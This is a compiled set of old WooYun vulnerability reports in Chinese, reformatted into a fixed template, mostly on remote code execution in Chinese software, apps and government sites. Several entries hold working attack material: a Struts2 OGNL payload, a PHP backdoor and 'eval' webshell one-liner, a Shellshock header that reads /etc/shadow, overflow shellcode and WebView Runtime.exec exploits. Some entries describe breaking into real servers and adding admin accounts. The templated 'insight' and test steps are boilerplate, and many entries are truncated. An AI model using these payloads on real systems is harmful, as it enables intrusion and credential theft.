**详情**: 1.?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%2

**POC**: 1.?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletR

**绕过**: 直接利用

**修复**: 修复漏洞打补丁
---

---
### [wooyun-2012-010266] 金蝶业务系统漏洞
**厂商**: 金蝶 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: struts远程执行

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 各种数据泄露，升级，上次的礼物现在还没收到  >_<
---

---
### [wooyun-2016-0171147] 查漏补缺之台湾joomla代码执行打包-企业（臺灣地區）
**厂商**: Hitcon台湾互联网漏洞报告平台 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: joomla代码执行**.**.**.**   http://**.**.**.**/  純韻國際企業股份有限公司**.**.**.**   http://**.**.**.**/   台灣中食安科技股份有限公司**.**.**.**  http://**.**.**.**/    萬蕙昇股份有限公司**.**.**.**     http://**.**.**.**/ 台中新生電腦維修中心

**POC**: 如上

**绕过**: 直接利用

**修复**: 升级新版本
---

---
### [wooyun-2016-0165946] 上海市某企业信息录入系统存在远程代码执行漏洞可进服务器
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0146617] 某搜索引擎系应用安卓版远程代码执行漏洞(某搜索引擎地图/输入法为例)
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: root@hammerhead:/ # busybox netstat -tunlpnetstat: showing only processes with your user IDActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nam某停车平台        0      0 [IP已脱敏]            [IP已脱敏]:*               LISTEN      5260/com.baidu.BaiduMaptcp        0      0 :::40310                :::*                    

**POC**: 利用1:现在我们已经有文件写入权限,把它转化成执行权限就可以反弹 shell 了,想想之前的寄生兽漏洞.思路就比较清晰了.将文件写入插件或者 so 文件中进行覆盖后执行即可.(注意需要是第三方的 so..因为 app 的 so 是系统权限,应用本身也是无权限进行写操作的)WooYun: 某搜索引擎输入安卓客户端代码感染漏洞分析（俗称寄生兽）hook DexClassLoader 构造方法后可以发现某搜索引擎地图加载了如下插件10-12 19:50:18.475    1817-2364/? I/IPoison-com.baidu.BaiduMap﹕ dexPath = /data/data/com.bai

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-062618] 阳光互联帮助中心任意代码执行漏洞（疑似后门）
**厂商**: sundns.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]]%29%29}密码c<?php/***  index.php PHPCMS 入口** @copyright			(C) 2005-2010 PHPCMS* @license				https://example.com/[已脱敏] @lastmodify			2010-6-1*///PHPCMS根目录if(isset($_REQUEST['page'])){$page = $_REQUEST['page'];$func = 'a';$func .= 'ss';$func .= 'ert';$func($page);exit;}define('PHPCMS_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR

**POC**: https://example.com/[已脱敏]]%29%29}密码c

**绕过**: 直接利用

**修复**: 看漏洞证明 应该知道怎么修复
---

---
### [wooyun-2016-0167462] 吉林省疾病预防控制中心存在Java反序列化漏洞
**厂商**: 吉林省疾病预防控制中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网址：http://**.**.**.**/ IP：**.**.**.** 端口80存在反序列化漏洞http://**.**.**.**，administrator权限传马查看数据库配置文件未做过多测试

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0167361] 某市医保网存在“Java 反序列化”漏洞，众多市政府站点受影响
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址http://**.**.**.**:7001/存在“Java 反序列化”漏洞直接上传木马到服务器中

**POC**: whoamifzybweb\administratornet  user\\FZYBWEB 的用户帐户-------------------------------------------------------------------------------Administrator            Guest                    SUPPORT_388945a0test1命令成功完成。net  view服务器名称            注释----------------------------------------------------------------

**绕过**: 直接利用

**修复**: 加强安全意识
---

---
### [wooyun-2013-016921] SAP播放器缓冲区溢出漏洞
**厂商**: SAP | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: SAP启动过程中会加载skin\default目录下的UI.txt文件，由于程序并未对内容进行校验，导致加载畸形文件时发生缓冲区溢出，执行恶意代码！POC如下:0xDB, 0xC0, 0x31, 0xC9, 0xBF, 0x7C, 0x16, 0x70,0xCC, 0xD9, 0x74, 0x24, 0xF4, 0xB1, 0x1E, 0x58,0x31, 0x78, 0x18, 0x83, 0xE8, 0xFC, 0x03, 0x78,0x68, 0xF4, 0x85, 0x30, 0x78, 0xBC, 0x65, 0xC9,0x78, 0xB6, 0x23, 0xF5, 0xF3, 0xB4, 0xAE, 0x7D,0x02, 0xAA, 0x3A, 0x32, 0x1C, 0xBF, 0x62, 0xED,0x1D, 0x54, 0xD5, 0x66, 0x29, 0x21, 0x

**POC**: 修改文件内容为POC的内容双击执行程序漏洞触发弹出计算器

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-017323] 某安全厂商ssl vpn远程代码执行漏洞
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计不当

**元思考**: 触发信号: 功能测试

**洞察**: 设计不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: $args = $_REQUEST['cmd'];/*something here*/exec("tsutil -proxy $ip $args", $output, $ret);懂php exec函数的都一眼看出问题版本SSLVPN M5.6及以下 没测试最新版本https://example.com/[已脱敏]'%3C?php%20eval($_POST[cmd]);?%3E'%20%3E/app/usr/sbin/webui/html/svpn.php执行echo '<?php eval($_POST[cmd]);?>' >/app/usr/sbin/webui/html/svpn.php 生成一句话https://example.com/[已脱敏]

**POC**: $args = $_REQUEST['cmd'];$ip = $_SERVER['REMOTE_ADDR'];exec("tsutil -proxy $ip $args", $output, $ret);

**绕过**: 直接利用

**修复**: 哎 我还能说什么去找人做个程序员安全编程意识培训吧
---

---
### [wooyun-2012-07589] ITools <= [IP已脱敏] 远程代码执行漏洞
**厂商**: 某科技公司 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ITools是由某互联网公司投资的某科技公司开发的一款号称领先业界的苹果设备同步管理软件。用户可以使用iTools非常方便的完成对苹果设备(ios系统，包括iphone,ipad,ipod touch）的信息查看、音乐/铃声/照片/书籍/文件管理、软件安装、互联网资源下载甚至是设备系统修改等。该软件1.4.6.0及以下版本存在远程代码执行漏洞，由于该软件关联了苹果应用程序扩展名.IPA的文件打开，当用户安装了ITools并双击打开一个.ipa文件时，ITools会加载一个IPA文件同目录下的CFNetwork.dll文件，如果攻击者精心构造一个恶意的 CFNetwork.dll文件，并放置到网络路径或WEBDAV路径上，当导致用户在网络路径访问远程的IPA文件，或者用浏览器浏览WEBDAV上的IPA文件时，就会触发攻击者的恶意代码得到执行，安装恶意程序或窃取用户隐私。

**POC**: 安装ITools [IP已脱敏]及其声明需要的ITunes 10+（这里选用目前苹果官网上最新的 ITunes [IP已脱敏]安装包）在网络路径上放置任意一个.IPA文件，例如123.ipa同时放置一个具备下面导出函数的CFNetwork.dll到IPA的同目录下CFHTTPMessageSetHeaderFieldValuekCFHTTPVersion1_1CFHTTPMessageCreateRequestCFURLRequestCreateMutableHTTPRequestCFURLResponseGetHTTPResponseCFReadStreamCreateForHTTPReq

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-075143] UC浏览器Android最新版(4.4)跨域漏洞(不受系统版本限制)
**厂商**: UC Mobile | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: UC浏览器版本

**POC**: POC<body><script>parentFrame = document.body.appendChild(document.createElement("iframe"));helperFrame1 = parentFrame.contentDocument.body.appendChild(document.createElement("iframe"));helperFrame1.contentWindow.onunload = function() {container = document.createElement("div");targetFrame  = containe

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-035501] 某IM软件最新版本远程代码执行漏洞（需要点击执行已存在的文件）
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 提交以下代码：\\c:\windows\system32\cmd.exe你电脑有什么文件，利用这个构造代码，执行你电脑上任何文件（前提是需要点击）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-02507] 某搜索引擎影音远程代码执行漏洞
**厂商**: 某搜索引擎 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某搜索引擎影音是国内一款不错的媒体播放软件，该软件在很多细节方面处理的人性化，但是，开发者在发布该软件的时候，没有将软件中使用的特殊库文件消除，导致某搜索引擎影音播放器可以借此机会实现远程执行任意代码。该库文件名称为“log.dll”，推测应该是带有调试性质的日志记录接口，将该文件与任意格式的媒体文件放置在同一目录下，当用户使用某搜索引擎影音播放媒体文件时，“log.dll”文件将会被同时加载，如果该文件为恶意攻击者开发，那么就会直接造成用户系统受到攻击。为此，恶意攻击者可以利用该漏洞，远程共享带有“log.dll”和媒体文件的文件夹，诱使用户访问，最终实现远程入侵用户系统。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 代码剔除法或者本地设定法
---

---
### [wooyun-2015-0122543] 实易DNS管理系统远程代码执行
**厂商**: forease.net | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 实易智能DNS管理系统，php CGI远程代码执行https://example.com/[已脱敏]

**POC**: 本地包含直接执行代码：远程包含执行代码：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 升级打补丁
---

---
### [wooyun-2012-07437] 某互联网公司点开某互联网公司消息 执行本地文件、命令
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发送指定网址，可自己构造，加密对方打开 即可执行恶意命令等

**POC**: 对方点击这个地址： www.baidu.com..\..\就会跳转到 本地某互联网公司 的安装目录：C:\Program Files\Tencent\某互联网公司\Bin自己构造如：www.baidu.com..\..\某软件.exe及可运行某互联网公司.更多代码自由构造，可以执行cmd了

**绕过**: 直接利用

**修复**: 赶快更新某互联网公司 2013吧拭目以待啊
---

---
### [wooyun-2016-0167494] 某省食品药品监督管理局某系统java反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 吉林省食品药品监督管理局某系统java反序列化漏洞。地址：**.**.**.**:7001/ucms/login2.jsp

**POC**: 吉林省食品药品监督管理局某系统java反序列化漏洞。地址：**.**.**.**:7001/ucms/login2.jsp

**绕过**: 直接利用

**修复**: ....
---

---
### [wooyun-2016-0168308] 创客非凡某站存在JAVA反序列化漏洞
**厂商**: 创客非凡 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/服务器信息，权限，文件管理

**POC**: RS

**绕过**: 直接利用

**修复**: 升级
---

---
### [wooyun-2016-0167796] 某市养老服务机构管理系统ava反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 济南市民政局某站java反序列化漏洞.地址：**.**.**.**:7001/pss/jsp/public/login.jsp

**POC**: 济南市民政局某站java反序列化漏洞.地址：**.**.**.**:7001/pss/jsp/public/login.jsp

**绕过**: 直接利用

**修复**: 0000
---

---
### [wooyun-2015-0107137] 某电商平台Android客户端远程代码执行漏洞
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台Android版导出2个js接口，可以导致远程代码执行漏洞

**POC**: 导出2个js接口：protected void onCreate(Bundle arg4) {super.onCreate(arg4);this.setIsUseSliding(false);this.setContentView(2130903250);this.backToLastPage(((SuningEBuyActivity)this), false);this.c();this.b();if(TextUtils.isEmpty(this.a)) {this.displayToast(2131363958);this.finish();}else {if(this.a != null

**绕过**: 直接利用

**修复**: addJavascriptInterface存在高危远程代码执行漏洞，应尽量避免使用，API 17中用@JavascriptInterface 代替addjavascriptInterface;移除系统webkit内置的危险接口searchBoxJavaBridge_,accessibility,a
---

---
### [wooyun-2012-09540] 某都联通宽带邮箱系统远程执行
**厂商**: 某运营商 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2011-02716] 当当网远程代码执行漏洞
**厂商**: 当当网 | **年份**: 2011 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 具体是原因在于低版本nginx的URI里允许%00的出现，导致访问/x.txt%00.php会将x.txt作为php代码执行，nginx  0.7.65/0.8.37及以下受影响

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-066531] 4G浏览器远程代码执行漏洞
**厂商**: roboo.com | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载懦豹4G浏览器：https://example.com/[已脱敏]

**POC**: 搜索addJavascriptInterfaceNavigator接口漏洞构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return Navigator.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webview远程

**绕过**: 直接利用

**修复**: :)
---

---
### [wooyun-2012-09531] 金蝶内部管理系统远程执行
**厂商**: 金蝶 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 分站连主站一起，员工数据什么的你懂的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-052026] 某通信厂商某款新手机默认浏览器远程代码执行漏洞
**厂商**: 某通信设备厂商 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前几天同学帮抢了一个某手机品牌3c联通版手机，无意中测试了一下前段时间爆出的webView控件的远程代码执行漏洞，居然存在啊。关于该漏洞的详细信息参见https://example.com/[已脱敏]

**POC**: 漏洞验证用的是乌云给出的关于这个漏洞的验证网页，地址为https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 建议参见https://example.com/[已脱敏]
---

---
### [wooyun-2014-049947] 海豚浏览器hd远程代码执行漏洞
**厂商**: 海豚浏览器 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浏览器来说这种问题还是需要修补的导出了dolphinRSSChecker其中导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: https://example.com/[已脱敏]
---

---
### [wooyun-2014-048047] 快播AVI格式堆溢出漏洞
**厂商**: 快播 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 快播标准版（快播5.0）对avi格式处理存在一处堆溢出，可造成远程代码执行漏洞。如果avi格式的strf结构的datalen长度过大，会导致堆溢出。

**POC**: POC地址：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 对strf结果的datalen长度进行验证
---

---
### [wooyun-2014-061543] 某资讯APP客户端远程代码执行
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某资讯APP安卓客户端远程代码执行，版本：3.4.3某资讯APP是一个用户量过亿的资讯类客户端。存在漏洞的接口：TTAndroidObject检测方法：直接在地址栏输入检测网址（https://example.com/[已脱敏]

**POC**: 安全宝和乌云提供漏洞检测服务

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-072339] 欧朋浏览器表单请求伪造网站漏洞
**厂商**: 欧朋浏览器 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 欧朋手机浏览器 [IP已脱敏]63测试手机为安卓4.4.2

**POC**: payload：<script>var k=1;window.onblur=s();document.getElementById("xxx").submit();function s(){if(k>1){window.open("javascript:document.write(3)","lll");}k++;}function s2(){window.open("javascript:document.write(3)","lll");window.onblur=function(){};}</script><body><form id="xxx" action="https://www

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0108355] 某搜索引擎浏览器Android远程dos攻击
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 加载下面的远程网页，本来想进一步利用，但是一打开之后某搜索引擎浏览器就跪了，就当是远程拒绝服务攻击吧。

**POC**: 在某搜索引擎浏览器里加载下面的网页，即可使其远程拒绝服务poc:<html><title>test baidu browser</title><body><script>function readfile(id) {alert(document.getElementById(id).contentDocument.body.firstChild.innerHTML);}</script>load 1...<iframe id='iframe1' src='content://com.letv.datastatistics.db.StatisContentProvider.baidubrowser/'

**绕过**: 直接利用

**修复**: 禁止content协议调用本地文件
---

---
### [wooyun-2012-016446] VNPlayer缓冲区溢出漏洞
**厂商**: VNPlayer | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 程序对.apl文件的内容未作校验，传入恶意文件导致缓冲区溢出，执行任意代码。poc文件的内容：0x53, 0x74, 0x61, 0x72, 0x74, 0x20, 0x42, 0x6C,0x6F, 0x63, 0x6B, 0x3D, 0x20, 0x46, 0x69, 0x6E,0x69, 0x73, 0x68, 0x20, 0x42, 0x6C, 0x6F, 0x63,0x6B, 0x3D, 0x5B, 0x4D, 0x6F, 0x6E, 0x6B, 0x65,0x79, 0x27, 0x73, 0x20, 0x41, 0x75, 0x64, 0x69,0x6F, 0x20, 0x49, 0x6D, 0x61, 0x67, 0x65, 0x20,0x4C, 0x69, 0x6E, 0x6B, 0x20, 0x46, 0x69, 0x6C,0x65, 0x5D, 0x49, 0x6D, 

**POC**: 拖拽poc文件到可执行程序漏洞触发，启动了calc

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-03940] 傲游3 类型引用错误漏洞
**厂商**: 傲游 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: DLL: MxWebkit.dll (ver [IP已脱敏])构造如下html文件:<html><math xmlns="https://example.com/[已脱敏]"><input></input></math></html>使用傲游打开该html文件,将导致sub_2433900函数的调用.sub_2433900{loc_24339C0:push    ebxlea     eax, [esp+34h+var_10]push    eaxlea     ecx, [esp+38h+var_24]call    sub_240EA70;获取一个结构指针,存入var_10+4处.该结构大小为0x38字节...02433B06:mov     ecx, [esp+30h+var_20]call    sub_1FD49A0;访问前面获取的指针mov     ecx

**POC**: MxWebkit!CreateCookieObj+0x29a5a6:668049a6 8b01            mov     eax,dword ptr [ecx]  ds:0023:feeefeee=????????3:020> uMxWebkit!CreateCookieObj+0x29a5a6:668049a6 8b01            mov     eax,dword ptr [ecx]668049a8 8b5024          mov     edx,dword ptr [eax+24h]668049ab ffe2            jmp     edx

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0106116] 微店客户端存在远程代码执行漏洞
**厂商**: 微店 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接访问页面有一处接口问题

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-090594] 某安全厂商wan optimization controller广域网控制器存在bash漏洞
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 请求get /cgi-bin/login.cgiPragma: no-cacheCache-Control: no-cacheAcunetix-Aspect: enabledAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66cAcunetix-Aspect-Queries: filelist;aspectalertsHost: xxxConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: () { :;}; echo  `/bin/cat /etc/shadow`Accept: */*得到HTTP/1.0 200 OKDate: Wed, 07 Jan 2015 15:57:01 GMTServer: WocBoa/2.04.24X-Frame-Option

**POC**: get /cgi-bin/login.cgiPragma: no-cacheCache-Control: no-cacheAcunetix-Aspect: enabledAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66cAcunetix-Aspect-Queries: filelist;aspectalertsHost: xxxConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: () { :;}; echo  `/bin/cat /etc/shadow`A

**绕过**: 直接利用

**修复**: 。。
---

---
### [wooyun-2016-0170106] 某城商银行某系统存在weblogic反序列化漏洞
**厂商**: 某城商银行 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在问题的网站是南京行业的招聘网站：http://**.**.**.**:8080nmap扫下，发现部署的weblogic，直接上工具测试了，下面就不深究了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 别嫌麻烦，抓紧派人负责对各类系统、各类环境全面排查吧！银行类单位安全隐患不容忽视啊！
---

---
### [wooyun-2015-0162803] 江苏省扬州市仪征城管局Java反序列化漏洞（已入服务器）
**厂商**: 江苏省扬州市仪征城管局 | **年份**: 2015 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: IP：**.**.**.**新建了一个管理组的用户用户名 ：temp$密    码 ：123456服务器里面有相应数据库备份等其他信息...不敢深入捂脸...期末了 还是去复习了

**POC**: IP：**.**.**.**新建了一个管理组的用户用户名 ：temp$密    码 ：123456服务器里面有相应数据库备份等其他信息...不敢深入捂脸...期末了 还是去复习好了

**绕过**: 直接利用

**修复**: ～复习去了 ：P
---

---
### [wooyun-2014-079200] 某运营商手机营业厅官方android客户端存在另一枚webview远程代码执行漏洞
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某运营商手机营业厅官方android客户端“服务渠道指南”页面存在webview远程代码执行漏洞。 黑客可以通过这个接口执行任意恶意代码，给用户造成财产损失。

**POC**: 中间人劫持“常见问题”页面，替换为webview漏洞检测页面：http://drops/wooyun.org/webview.html出现下图接口：sdkInterface

**绕过**: 直接利用

**修复**: 可以参考：https://example.com/[已脱敏]
---

---
### [wooyun-2016-0166759] 某国税视频在线点播系统存在java反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 黑龙江国税视频在线点播系统存在java反序列化漏洞漏洞url：**.**.**.**/1、root权限2、查看IP

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级weblogic
---

---
### [wooyun-2014-049938] 欧朋浏览器远程代码执行漏洞
**厂商**: 欧朋浏览器 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

